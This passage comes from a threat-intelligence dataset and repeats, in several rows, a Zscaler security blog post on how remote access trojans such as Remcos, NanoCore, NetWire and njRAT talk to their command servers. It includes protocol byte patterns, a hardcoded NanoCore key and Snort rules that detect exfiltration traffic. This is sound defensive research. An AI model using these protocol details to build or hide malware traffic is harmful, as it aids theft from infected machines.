byte\_test:1,!=,varbyte,11; byte\_test:1,=,varbyte,12; byte\_test:1,=,varbyte,13; byte\_test:1,!=,varbyte,15; byte\_extract:4,16,vardword; byte\_test:4,=,vardword,20; byte\_test:4,=,vardword,24; byte\_test:4,=,vardword,28; byte\_test:4,!=,vardword,0; sid:8000031; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NjRat - Data Exfil activity""; flow:to\_server,established; content:""|00|inf""; offset:3; depth:4; pcre:""/\d{1,3}\x00\w{1,3}/""; pcre:""/(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?/""; flowbits:isset,ZS.njrat; flowbits:unset,ZS.njrat; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NjRat - Data Exfil activity""; flow:to\_server,established; content:""|00|ll""; offset:3; depth:3; pcre:""/^\d{1,3}\x00/""; pcre:""/(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?/""; flowbits:set,ZS.njrat; flowbits:noalert; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*"
annoctr,annoctr/AnnoCTR/text/train/zscaler_2021-05-05_catching-rats-over-custom-protocols.txt,zscaler_2021-05-05_catching-rats-over-custom-protocols,G0064,"Catching RATs Over Custom Protocols May 05, 2021 Adversaries generally use Standard Application Layer Protocols for communication between malware and command and control (C&C) servers. This is for several reasons: first, malicious traffic blends in more easily with legitimate traffic on standard protocols like HTTP/S; second, companies that rely on appliances for security often don’t inspect all SSL/TLS encrypted traffic as it is extremely resource-intensive to do so. However, the massive growth of SSL attacks – [260% higher in 2020 compared to 2019](/blogs/security-research/2020-state-encrypted-attacks) – has turned many security teams’ attention to these encrypted channels. For those that do inspect their encrypted traffic, modern network security proxies, gateways, and firewalls are evolved enough to conveniently parse application protocols and strip the SSL layer to scan the underlying data. And by knowing the protocol, scan engines using heuristics or machine-learning techniques can more easily differentiate between malicious and legitimate traffic, giving security teams an advantage. These trends have led some adversaries to turn to custom protocols. Although custom protocols for malicious communication are nothing new, almost one-third of prevalent malware families we recently analyzed support communication over non-HTTP/S protocols. Almost all of these malware families are Remote Access Trojans (RATs) and are found all over, from campaigns of mass infection to highly targeted attacks. In this article, we dissect the custom protocols used in some of the most prevalent RATs seen in recent campaigns. At the end, we share a number of signatures and Snort rules that aid in detecting these attacks. Below are statistical representations of traffic that Zscaler blocked for non-HTTP/S C&C communication, as well as the most active RAT families that we observed over a three-month period. ![](https://lh5.googleusercontent.com/aYzD50PDgdfzxXZyjeGnZ1rFbL-b7dYT3UQCAZqIIgf8MAI3Adj4MziWl0n-AuYx6tISUTHpur-YwI9J7Z2s7gKMRX_eLqMUMoDEdQ1NcJYgiHUZNj6taGB_E-S9p0XZ7MhBSPR1) *Fig.1: Hits of top threats communicating over non-HTTP/S in the last quarter.* *![](https://lh5.googleusercontent.com/PriwwYlpzpsb-E89vgyjWguBklqQvrw8j4DN9ttZ_LaIShbiWvvvyVjUw-MgUxV6X-JU_DTOWtl5VGU06GqCY83AsXDuBJee6_cx0egzqKtIVxD7TnkT1-z_frrKimsVbb7Z9ApG)* *Fig.2: Hits of top non-HTTP/S based RAT families in last quarter.* ### **Remcos RAT** Remcos is remote access and surveillance software developed and distributed by an organization called Breaking Security. The Remcos RAT appeared in hacking forums in late 2016. Since then, it has been favored by many cyber criminals and even adopted by APT actors such as the [Gorgon Group](https://attack.mitre.org/groups/G0078/) and [Elfin Group](https://attack.mitre.org/groups/G0064/). Remcos is primarily delivered to victims via malicious attachments in phishing emails. Its capabilities range from logging keystrokes to executing commands, stealing credentials, and capturing microphones and webcams. RC4 key and encrypted configuration data is kept in the resource section “SETTINGS” under “RCData”. The configuration contains the C&C address, port, mutex name, and encryption key for C&C communication. ![](https://lh6.googleusercontent.com/zN7waqVzJ7bcYrfOAkgqH-_czg5hvNth-DIU6ll956XT3r7e49_4CLHbjXWxlnc7D4fCrNd_UIXEW3hKz8K4Wt7lGVLzCuIsbBTcUhFu4JP0n4f4zFXterYWG-HxAva4QI_S5gIo) *Fig.3: Encrypted configuration in resource.* ![](https://lh5.googleusercontent.com/vd-LhD9lYGPqT3Yl_ABwdyq2A0yN5YasLtqsvF_hSua6QkxIMi9MZ0zgtZfpRDpSgUfZmxbCKOcB4G9mUh7VY5uSDjYzUwHl8wjZzk102ApFqJeabOokBoYv0Z3nSZ2b2pOTZZ3d) *Fig.4: Decrypted configuration* Remcos communicates over non-HTTP/S channels/ports on custom protocols. The bot can be configured to communicate in plain text, which makes it fairly straightforward to detect C&C traffic. The custom protocol contains the header “[DataStart]” followed by the size of data and then followed by the exfiltrated data. ![](https://lh5.googleusercontent.com/7wLs8lUEMdYFPShrSwZR0DS-dWkSEznyb1LzuiirRBrwkx_aOfRHBBA9IZi6M3wA_tZ8wmTxQ-nVQQRAXBqHX1bUn9QziriO_-34JLECbcWR-OTBtiG6WhFF2EQQxOYd8qQz_vnB) *Fig.5: Data sent to C&C server in plain text.* However, in most cases, the communication is encrypted using the RC4 algorithm with a key present in the configuration. It is not possible to match signatures in encrypted binary data. However, there is scope for heuristics-based detection. Upon execution, Remcos sends system information to its C&C server, and in return the server replies with commands to execute. As this request and response is encrypted with the same symmetric key, the header “[DataStart]” will generate the same encrypted stream of bytes in place of the header for all communication generated by the executable. ![](https://lh5.googleusercontent.com/ueaF5gjccOqVQVXS2sRGsLoQin-mq3xSkD-SwxC7XZRlQLqmidAWsItAJKXAALu_LIsYjNqovbDiRsM3DRRqSg6lvtdZ9s4SvOJuxehAqyQA6pj0uhLjIdNuwNvOZlUXBinfRIsI) *Fig.6: Data sent to C&C server as RC4 encrypted.* As an example, it can be seen in the above image, a binary stream of bytes “08 b4 de f6 84 27 70 9a 57 17 5e” has taken place of the header “[DataStart]”. The repeated stream pattern of 11 bytes in requests and responses—plus a combination of other heuristics such as entropy and data length limits—can be considered for flagging RC4 encrypted Remcos traffic. ### **Crimson RAT** Crimson RAT has been favored by threat actors for targeted attacks on governments and organizations in the financial, healthcare, and space technology sectors. In 2016, it was found to be used in targeted attacks against Indian diplomatic and military resources. Last year, we found it [targeting Indian financial institutions](/blogs/security-research/targeted-attack-indian-financial-institution-delivers-crimson-rat). Crimson is typically delivered to the victim via a phishing email containing a malicious .doc file or link to a malicious executable. ![](https://lh3.googleusercontent.com/c7KKJMQxQbwMWpqvZ_pJkOGJ6PmWkAp4tsVV3p2Bz3q0URqeSGgeSN9pxCx23208FoGOV4FeHCC6KDY3foKhvH9u1izFykL4QfoUi2Hxgs4rA_Wgtnzh6arhGnzXhGB3hG65-euh) *Fig.7: Data sent to C&C server* ### **NetWire RAT** The NetWire RAT is a malicious tool that emerged almost a decade ago and has been updated many times since then. NetWire has been detected in various campaigns such as [Hydrojiin](/blogs/security-research/look-hydrojiin-campaign) and advanced persistent threat (APT) attacks including [SilverTerrier](https://attack.mitre.org/groups/G0083/) and [The White Company](https://attack.mitre.org/groups/G0089/). Typically, the NetWire RAT is downloaded as a second-stage payload to systems that have been compromised using other malware such as GuLoader. Also, it was found to be delivered via [exploit kits](/blogs/security-research/sundown-chronicles-observations-exploit-kits-evolution). NetWire communicates with custom protocols over TCP and communication is encrypted with AES encryption. Each packet begins with a length of data followed by one byte for the command and then followed by data. The initial packet sends a 32-byte seed value along with 16-byte IV value and hardcoded password specified in the binary to generate the AES key. The C&C server generates a session key for this information. ![](https://lh4.googleusercontent.com/usA4f2R1PIROH6JL8hvC6FHrb_GuwbBcM3LO2F6hudKGMeEyRfB3Waea5wyfE3nSlk6MyqzXj0SE6t05M4etgOhBwOGYJ_pa2Akv4hN8S34D4S3CRVALYkQwBGqdRCThxlk9ZHrk) *Fig.8: Data sent to C&C server as AES encrypted.* As the communication is AES encrypted, it is not possible to scan for signature patterns in communication. However, there is enough information in the initial packet to flag the traffic as NetWire C&C communication. ### **AsyncRAT** AsyncRAT is an open-source RAT designed to remotely monitor and control other computers through a secure encrypted connection. AsyncRAT provides functionality such as keylogger, screen viewer, command execution, and many more. Because of its feature of secure communication, AsyncRAT is used for malicious motives by cybercriminals and weaponized in APT campaigns such as ""[Operation Spalax](https://www.welivesecurity.com/2021/01/12/operation-spalax-targeted-malware-attacks-colombia/). AsyncRAT has been found to be delivered via various methods such as spear-phishing, malvertising, and exploit kits. AsyncRAT communicates over secure TCP channels. As the custom certificate is carried in the binary itself and matched against the C&C certificate, it is not possible to strip the TLS layer at the proxy/gateway level. However, such custom certificates can be filtered out and communication can be blocked by other preventing controls. ![](https://lh6.googleusercontent.com/BNgh3pB-hE3i75fI2LSr9VK7ePZZBZCsiph1M5US6SA0Bbpxa16uuoyrATQTg3bxHjUbU7Ioe65psbtZBq0_Wt9JzweADaAdhdmck0S9UAt6ildONREL6uTwxoyARwUHLznCo48P) *Fig.9: Server certificate having subject and issuer name as “AsyncRAT Server”* #### **Quasar RAT** Quasar is an open-source RAT that has been observed being used maliciously by cybercriminals and APT actors including “[Gorgon Group](https://attack.mitre.org/groups/G0078/)” and “[Patchwork](https://attack.mitre.org/groups/G0040/). Its features include remote desktop, keylogging, password stealing, and many more. Quasar encrypts communications using an AES algorithm with a pre-shared key hardcoded in the client binary. It is not possible to scan for signature patterns on AES-encrypted traffic. However, the distinctive characteristics of encrypted data packets can be leveraged to flag Quasar's AES encrypted traffic. ![](https://lh3.googleusercontent.com/McWJS_eN_K5qholLoB9qdc8ov8DeRV38MG1uGZ-_1F4rRmCrKiFUKo1rrV5YHo4yI1xUPFtw8z-h2sc7F-8C9_bIH8vW1FWxdKL2FVKRXBox2vL71qJsAnhSI4GDRslj74o8f3gI) *Fig.10: Data sent to C&C server as AES encrypted.* The distinctive first 4 bytes of the payload can be used to identify Quasar traffic. Specifically, the first 4 bytes can identify the first packet sent from the server to the client following the TCP handshake. This packet is used to initiate the server/client authentication process. The first 4 bytes of the TCP payload contain ""40 00 00 00"" which is the size of the data that follows in little endian. ### **Agent Tesla RAT** The Agent Tesla RAT has been very active and prevalent. Over the last couple of years, there have been huge ongoing phishing campaigns delivering Agent Tesla RAT. Agent Tesla has evolved over time, varying its behavior from campaign to campaign. Cybercriminals use this RAT to steal user credentials and spy on victims through screenshots, keyboard logging, and clipboard capturing. Credential stealing is supported across various software ranging from browsers to mail clients, VPNs, and wallets. Agent Tesla communicates and exfiltrates data to its C&C server on HTTP, FTP, SMTP, and Telegram API. All collected data is encapsulated into an HTML page, and that HTML page is sent to a C&C over one of the aforementioned protocols. For communication over FTP, the HTML page is sent as a file to an FTP C&C server. The file name is generated in format “PW\_<UserName>\_<OS>\_<Timestamp>.HTML” ![](https://lh5.googleusercontent.com/Y2YwbsGuKtRdA_tsmpFz6qgeMTmxXwe-zF7sgYpReVYihtEZu9w08FFi-yJ5qzMCnwYd4r6fzrGcDDUroOywVfewZonLRNFxZwPQphavAwcr0ADmVNNUqlNrHIi-rJPmfDqtapIU) *Fig.11: Data to be sent via FTP.* ![](https://lh3.googleusercontent.com/8F2MVgT3zx-6rcHGYEHNkJp9wj610xCU0yscksACAnADDhWCNdNZ7sBkzjHrsY1PLAGurtUGTjlBBf4TQTK-P4Jxq42mm0_1A0-LpwsP373wrC6lYZOS9sgarmgIl3Auq8CzRQy0) *Fig.12: Exfiltration over FTP* For communication over SMTP, the HTML page is sent as a mail body to the C&C server. The mail subject is generated in format “PW\_<UserName>/<ComputerName>”. ![](https://lh3.googleusercontent.com/KYoapIP64WbQl-mIxxYgRLvQSfgBJKwb9u8jg2zaJVJgaaSrRvsgJO3Hau49yWAr9H4VeOfc1l5f_viEFHZkKKUwEEyQc1WufV2JPf5vDBjadrOkgLSp1Wcj9hEJrTJ53a7sHfjA) *Fig.13: Exfiltration over SMTP* ### **CyberGate RAT** CyberGate allows an attacker to browse and manipulate files, devices, and settings on the victim's machine as well as download and execute additional malware. It also has a wide range of information-stealing abilities including browser credential theft, keylogging, screen capture, and remote enabling of webcams. The CyberGate RAT communicates on a custom protocol over TCP. CyberGate collects the info as per the command received from the C&C server, compresses data by ZLib, encrypts it by RC4 with a hardcoded key, and then sends it to the C&C server. ![](https://lh5.googleusercontent.com/w7yMadYDfy63uAqE1g1xU9jgXCwXmDTdXnlH9nKlKi6vHxwnMVdpW2yTY_Yc0RENUtNHigOp-bqQ9xcdhsLtcU3gza8f2Gl48_C--ecJSnlc4CIvPjpB1geOiwUYVHBwb8S1Vjmj) *Fig.14: Compressed and Encrypted data sent to C&C.* Packets begin with the data length followed by a marker then by a new line delimiter followed by encrypted data. To flag the CyberGate RAT traffic, a combination of data length, marker, and delimiter can be considered. ### **NanoCore RAT** Though NanoCore RAT emerged almost a decade ago, it is still one of the most prevalent RAT families, and multiple versions have appeared since then. NanoCore RAT is modular malware which comes with plugin support to expand its functionality. Basic plugins feature remote surveillance via remote desktop, monitor webcam, capture audio, etc. Additional plugins have been found to be used for cryptocurrency mining, ransomware attacks, credential stealing, and more. NanoCore RAT has been found to be delivered via phishing emails containing .doc macros that load a NanoCore binary with fileless infection techniques. NanoCore communicates on a custom protocol over TCP and uses the DES algorithm with hardcoded key and IV value to encrypt the communication between bot and its C&C server. The communication packet begins with a 4-byte data length followed by DES-encrypted data of that length. ![](https://lh3.googleusercontent.com/Kmhmv9brGs4R-gbEkuKh4W4GdCVsEFslRyxOrVNV9Rdgpc3wGLEf6QQhviCLHNkMet7yfp1Ft7YSbRSXC0v7_1LsEabrZQeWq2he2ZMpANYPyeCF7G6hLH7ZJqvVBNBM54GlQRXJ) Fig.15: Encrypted data C&C communication It is not possible to scan for patterns in DES-encrypted data. However, we observed that the publicly available bot builder does not have an option for configuring the DES key. Thus, all samples generated from this bot-builder will have the same DES key, which is “722018788C294897”. This results in some encrypted traffic that will be the same across all bots generated using the publicly available bot-builder. One such command from the server is “is alive” which is 0x600; when encrypted with a key it will produce “c1 c3 d0 32 43 59 a1 78”. However, there are other customized bot-builders available underground that allow the user to configure the key. For a more generic detection, we need to check for heuristics of data length value against TCP packet size and entropy of data. The first response from the server will be always 0x24 bytes in length, and the first 4 bytes will always be “20 00 00 00”. This response contains a GUID of plugins that the bot will load. The bot responds back to this with 0x12 bytes data, which will always start with the 4-byte stream “08 00 00 00”. These characteristics can be leveraged for detection. ![](https://lh4.googleusercontent.com/4Az6eIbXS8nGOa0nXeVKw8ahmi2f46MSMsDp0IkUkhyeNdlLIAlDODx-tlGFKh6z6WLf8H18JFnWJAj8mOsAYP2jfo1Hg65SSyPvAJ-ANHCOwMS05rZ5D2LLb-qDoDDvJvnn1Z-w) Fig.16: Fix length first response from C&C server. ### **Gh0st RAT** Gh0st is an open-source RAT that has been observed being used maliciously by cybercriminals and APT actors such as “[TA459](https://attack.mitre.org/groups/G0062/)” and “[APT18](https://attack.mitre.org/groups/G0026/)."". Its features include remote desktop, logging keystrokes, stealing credentials, capturing microphone and webcam, and many more. The source code of the Gh0stRAT is publicly available and attackers have customized it to suit their needs. Thus, many variants have been discovered. Gh0st communicates on a custom protocol over TCP. It uses a sequential byte-to-byte encryption algorithm to encrypt communication with the C&C server. Upon execution, it collects system data such as system information, version, processor description, installed antivirus, etc. Then, a marker and data length are prepended to this data. Finally, collected data is encrypted with single-byte operation of XOR and SUB on each byte. ![](https://lh4.googleusercontent.com/4LbGU33qsv7CmoSQurQlSHwWvXM7Ma3GRLeKAxXQbftHAIkXMF6EW5ucgwBdclY84Zq5-ZY0K1vwARPoCUS7fUUK4C1NTdnVBcF_2t6XwK56x9c4TwsdE5tQoKeteaX_lUESl0NS) *Fig.17: Collected data before encryption and after encryption.* ### **njRAT** Discovered almost a decade ago, njRAT, also known as Bladabindi, is the most active and prevalent remote access trojan. It allows attackers to do surveillance and control the victim's computer. Its features include remote desktop, logging keystrokes, stealing credentials, capturing microphone and webcam, and many more. njRAT is mostly found to be delivered via phishing email campaigns containing malicious Word document attachments. It is also found to be delivered by masquerading as a legitimate application installer uploaded to file-sharing services and luring victims via drive-by download campaigns. Since the leak of source code 2013, njRAT has become widely adopted by cybercriminals and APT actors including [Gorgon Group](https://attack.mitre.org/groups/G0078/) and [APT41](https://attack.mitre.org/groups/G0096/). Numerous variants have been detected over the years. Some variants have been found to be communicating over standard HTTP protocol and others were found to be communicating over custom protocols over TCP. The packet begins with data length in a decimal format null-terminated string followed by command and then delimiter followed by exfiltrated data. ![](https://lh6.googleusercontent.com/Q9ONmRNh0G3xnn2RPK3XQs9oRlGKpb8izMFU7exiDBuTNfSuCJxI6FWKlGsCgEN6s3lmozlZapJ3wjin-jZAYFSeQYvJBxvvBpeHe9flzbDgTdAqUeyWDCheWfPpwtyACyfM-rBR) *Fig.18: Fix length first response from C&C server.* ### **Coverage:** Zscaler’s multilayered cloud security platform detects indicators at various levels. The following are the Cloud IPS (non-HTTP/S) signatures that enable detection of the above RATs: [Win32.Backdoor.RemcosRAT](https://threatlibrary.zscaler.com/threats/4461cfa5-4155-499b-a1b5-e866cd05df97) [Win32.Backdoor.NetwiredRC](https://threatlibrary.zscaler.com/threats/8e9bd46b-2820-4f49-8b11-8712761e366d) [Win32.Backdoor.CrimsonRAT](https://threatlibrary.zscaler.com/threats/1d5c6832-d582-41cd-a050-e51251663138) [Win32.Backdoor.AsyncRAT](https://threatlibrary.zscaler.com/threats/2a3c4fd0-57d3-4816-8ffe-400f95ba6f37) [Win32.Backdoor.QuasarRAT](https://threatlibrary.zscaler.com/threats/3e8d15d9-287b-4ed2-ab16-fa58f7446a59) [Win32.Backdoor.AgentTesla](https://threatlibrary.zscaler.com/threats/35372622-693c-4166-8b6e-ccbf7f669cb5) [Win32.Backdoor.Cybergate](https://threatlibrary.zscaler.com/threats/6430f34a-aece-42ef-9435-c1bcc45a7f4b) [Win32.Backdoor.Nanocore](https://threatlibrary.zscaler.com/threats/51db83e0-80cf-4760-81a9-db4af507a5d8) [Win32.Backdoor.Gh0stRAT](https://threatlibrary.zscaler.com/threats/124cb8b3-bca5-420f-a4c5-71f4450d3ed3) [Win32.Backdoor.NjRat](https://threatlibrary.zscaler.com/threats/5056fbf2-0119-4348-9b26-59feccdd5bb7/) ### **Conclusion** All of the above-discussed RATs are communicating on custom and encrypted protocols over TCP. When communication is encrypted, it is more difficult to scan for their signature patterns in network traffic. However, we have discussed alternative ways to flag RAT traffic based on the heuristics of encrypted data. Four properties that are common to most RAT traffic on non-HTTP/S are: 1.Packets start with a length of encrypted data. Adding 4 to the little endian value of the first 4 should give the total length of TCP data. 2.Entropy of data followed after data length is high. 3.The C&C server responds in the same packet format as the client. 4.Often, server responses have lengths in specific ranges as they send only commands. Snort Rules ----------- *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.CrimsonRat - CNC command""; flow:established,to\_client; content:""|00 00 00 00|""; offset: 1; depth: 4; pcre:""/\x00\x00\x00\x00(thumb|filsz|rupth|dowf|endpo|scrsz|cscreen|dirs|stops|scren|cnls|udlt|delt|afile|listf|file|info|runf|fles|dowr|info|fldr)+=/""; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NetWiredRC - Check-in request""; flow:established,to\_server; dsize:69; content:""|41 00 00 00 99|""; offset:0; depth:5; flowbits:set,ZS.NetwireRAT.Client; flowbits:noalert; metadata: classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NetWiredRC - Check-in response""; flow:established,to\_server; dsize:5; content:""|3f 00 00 00 9b|""; flowbits:isset,ZS.NetwireRAT.Client; metadata: classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.AsyncRAT - Malicious SSL Cert""; flow:established,to\_client; content:""|16 03 01|""; offset:0; depth:3; content:""AsyncRAT""; distance:0; fast\_pattern; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.QuasarRAT - CNC response header""; flow:established,to\_client; dsize:68; content:""|40 00 00 00|""; offset: 0; depth: 4; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.AgentTesla CNC via FTP/SMTP""; flow:established,to\_server; content:""|3C|html|3E|Time|3A|""; content:""|3C|br|3E|User Name|3A|""; content:""|3C|br|3E|Computer Name|3A|""; distance: 0; content: ""|3C|br|3E|OSFullName|3A|""; distance: 0; content:""CPU|3A|""; distance: 0; content:""|3C|br|3E|RAM|3A|""; distance: 0; content: ""URL|3A|""; distance: 0; content: ""Application|3A|""; distance: 0; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> any any (msg:""Zscaler Win32.Backdoor.CyberGate - Data Exfiltration""; flow:established,to\_server; dsize:40<>300; pcre:""/\d{2,3}[#$]{4,6}\x0d\x0a/""; content:""|23 23 24 23 23 0d 0a|""; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.Nanocore Pulse check""; flow:established,to\_server; dsize:12; content:""|08 00 00 00|""; offset: 0; depth: 4; content:""*/*c1 c3 d0 32 43 59 a1 78|""; distance:0; within:8; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.Nanocore - Generic C&C command (request)""; flow:established,to\_server; flowbits:isset,ZS.NanocoreGen; dsize:12; content:""|08 00 00 00|""; offset:0; depth:4; byte\_test:1,!=,0,5,relative; reference:url,https://zscaler.com;)* *alert tcp $EXTERNAL\_NET any -> $HOME\_NET any (msg:""Zscaler Win32.Backdoor.Nanocore - Generic C&C command (response)""; flow:established,to\_client; flowbits:noalert; flowbits:set,ZS.NanocoreGen; content:""|20 00 00 00|""; offset:0; depth:4; byte\_test:1,!=,0,5,relative; dsize:36; reference:url,https://zscaler.com;)* *alert tcp any any -> any any (msg:""Zscaler Win32.Backdoor.Gh0stRAT - Possible Data Exfil activity""; flow:to\_server,established; byte\_extract:1,10,varbyte; byte\_test:1,!=,varbyte,11; byte\_test:1,=,varbyte,12; byte\_test:1,=,varbyte,13; byte\_test:1,!=,varbyte,15; byte\_extract:4,16,vardword; byte\_test:4,=,vardword,20; byte\_test:4,=,vardword,24; byte\_test:4,=,vardword,28; byte\_test:4,!=,vardword,0; sid:8000031; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NjRat - Data Exfil activity""; flow:to\_server,established; content:""|00|inf""; offset:3; depth:4; pcre:""/\d{1,3}\x00\w{1,3}/""; pcre:""/(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?/""; flowbits:isset,ZS.njrat; flowbits:unset,ZS.njrat; classtype:trojan-activity; reference:url,https://research.zscaler.com;)* *alert tcp $HOME\_NET any -> $EXTERNAL\_NET any (msg:""Zscaler Win32.Backdoor.NjRat - Data Exfil activity""; flow:to\_server,established; content:""|00|ll""; offset:3; depth:3; pcre:""/^\d{1,3}\x00/""; pcre:""/(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?/""; flowbits:set,ZS.njrat; flowbits:noalert; classtype:trojan-activity; reference:url,https://research.zscaler.com;)*"
annoctr,annoctr/AnnoCTR/text/train/zscaler_2021-05-05_catching-rats-over-custom-protocols.txt,zscaler_2021-05-05_catching-rats-over-custom-protocols,G0078,"Catching RATs Over Custom Protocols May 05, 2021 Adversaries generally use Standard Application Layer Protocols for communication between malware and command and control (C&C) servers. This is for several reasons: first, malicious traffic blends in more easily with legitimate traffic on standard protocols like HTTP/S; second, companies that rely on appliances for security often don’t inspect all SSL/TLS encrypted traffic as it is extremely resource-intensive to do so. However, the massive growth of SSL attacks – [260% higher in 2020 compared to 2019](/blogs/security-research/2020-state-encrypted-attacks) – has turned many security teams’ attention to these encrypted channels. For those that do inspect their encrypted traffic, modern network security proxies, gateways, and firewalls are evolved enough to conveniently parse application protocols and strip the SSL layer to scan the underlying data. And by knowing the protocol, scan engines using heuristics or machine-learning techniques can more easily differentiate between malicious and legitimate traffic, giving security teams an advantage. These trends have led some adversaries to turn to custom protocols. Although custom protocols for malicious communication are nothing new, almost one-third of prevalent malware families we recently analyzed support communication over non-HTTP/S protocols. Almost all of these malware families are Remote Access Trojans (RATs) and are found all over, from campaigns of mass infection to highly targeted attacks. In this article, we dissect the custom protocols used in some of the most prevalent RATs seen in recent campaigns. At the end, we share a number of signatures and Snort rules that aid in detecting these attacks. Below are statistical representations of traffic that Zscaler blocked for non-HTTP/S C&C communication, as well as the most active RAT families that we observed over a three-month period. ![](https://lh5.googleusercontent.com/aYzD50PDgdfzxXZyjeGnZ1rFbL-b7dYT3UQCAZqIIgf8MAI3Adj4MziWl0n-AuYx6tISUTHpur-YwI9J7Z2s7gKMRX_eLqMUMoDEdQ1NcJYgiHUZNj6taGB_E-S9p0XZ7MhBSPR1) *Fig.1: Hits of top threats communicating over non-HTTP/S in the last quarter.* *![](https://lh5.googleusercontent.com/PriwwYlpzpsb-E89vgyjWguBklqQvrw8j4DN9ttZ_LaIShbiWvvvyVjUw-MgUxV6X-JU_DTOWtl5VGU06GqCY83AsXDuBJee6_cx0egzqKtIVxD7TnkT1-z_frrKimsVbb7Z9ApG)* *Fig.2: Hits of top non-HTTP/S based RAT families in last quarter.* ### **Remcos RAT** Remcos is remote access and surveillance software developed and distributed by an organization called Breaking Security. The Remcos RAT appeared in hacking forums in late 2016. Since then, it has been favored by many cyber criminals and even adopted by APT actors such as the [Gorgon Group](https://attack.mitre.org/groups/G0078/) and [Elfin Group](https://attack.mitre.org/groups/G0064/). Remcos is primarily delivered to victims via malicious attachments in phishing emails. Its capabilities range from logging keystrokes to executing commands, stealing credentials, and capturing microphones and webcams. RC4 key and encrypted configuration data is kept in the resource section “SETTINGS” under “RCData”. The configuration contains the C&C address, port, mutex name, and encryption key for C&C communication. ![](https://lh6.googleusercontent.com/zN7waqVzJ7bcYrfOAkgqH-_czg5hvNth-DIU6ll956XT3r7e49_4CLHbjXWxlnc7D4fCrNd_UIXEW3hKz8K4Wt7lGVLzCuIsbBTcUhFu4JP0n4f4zFXterYWG-HxAva4QI_S5gIo) *Fig.3: Encrypted configuration in resource.* ![](https://lh5.googleusercontent.com/vd-LhD9lYGPqT3Yl_ABwdyq2A0yN5YasLtqsvF_hSua6QkxIMi9MZ0zgtZfpRDpSgUfZmxbCKOcB4G9mUh7VY5uSDjYzUwHl8wjZzk102ApFqJeabOokBoYv0Z3nSZ2b2pOTZZ3d) *Fig.4: Decrypted configuration* Remcos communicates over non-HTTP/S channels/ports on custom protocols. The bot can be configured to communicate in plain text, which makes it fairly straightforward to detect C&C traffic. The custom protocol contains the header “[DataStart]” followed by the size of data and then followed by the exfiltrated data. ![](https://lh5.googleusercontent.com/7wLs8lUEMdYFPShrSwZR0DS-dWkSEznyb1LzuiirRBrwkx_aOfRHBBA9IZi6M3wA_tZ8wmTxQ-nVQQRAXBqHX1bUn9QziriO_-34JLECbcWR-OTBtiG6WhFF2EQQxOYd8qQz_vnB) *Fig.5: Data sent to C&C server in plain text.* However, in most cases, the communication is encrypted using the RC4 algorithm with a key present in the configuration. It is not possible to match signatures in encrypted binary data. However, there is scope for heuristics-based detection. Upon execution, Remcos sends system information to its C&C server, and in return the server replies with commands to execute. As this request and response is encrypted with the same symmetric key, the header “[DataStart]” will generate the same encrypted stream of bytes in place of the header for all communication generated by the executable. ![](https://lh5.googleusercontent.com/ueaF5gjccOqVQVXS2sRGsLoQin-mq3xSkD-SwxC7XZRlQLqmidAWsItAJKXAALu_LIsYjNqovbDiRsM3DRRqSg6lvtdZ9s4SvOJuxehAqyQA6pj0uhLjIdNuwNvOZlUXBinfRIsI) *Fig.6: Data sent to C&C server as RC4 encrypted.* As an example, it can be seen in the above image, a binary stream of bytes “08 b4 de f6 84 27 70 9a 57 17 5e” has taken place of the header “[DataStart]”. The repeated stream pattern of 11 bytes in requests and responses—plus a combination of other heuristics such as entropy and data length limits—can be considered for flagging RC4 encrypted Remcos traffic. ### **Crimson RAT** Crimson RAT has been favored by threat actors for targeted attacks on governments and organizations in the financial, healthcare, and space technology sectors. In 2016, it was found to be used in targeted attacks against Indian diplomatic and military resources. Last year, we found it [targeting Indian financial institutions](/blogs/security-research/targeted-attack-indian-financial-institution-delivers-crimson-rat). Crimson is typically delivered to the victim via a phishing email containing a malicious .doc file or link to a malicious executable. ![](https://lh3.googleusercontent.com/c7KKJMQxQbwMWpqvZ_pJkOGJ6PmWkAp4tsVV3p2Bz3q0URqeSGgeSN9pxCx23208FoGOV4FeHCC6KDY3foKhvH9u1izFykL4QfoUi2Hxgs4rA_Wgtnzh6arhGnzXhGB3hG65-euh) *Fig.7: Data sent to C&C server* ### **NetWire RAT** The NetWire RAT is a malicious tool that emerged almost a decade ago and has been updated many times since then. NetWire has been detected in various campaigns such as [Hydrojiin](/blogs/security-research/look-hydrojiin-campaign) and advanced persistent threat (APT) attacks including [SilverTerrier](https://attack.mitre.org/groups/G0083/) and [The White Company](https://attack.mitre.org/groups/G0089/). Typically, the 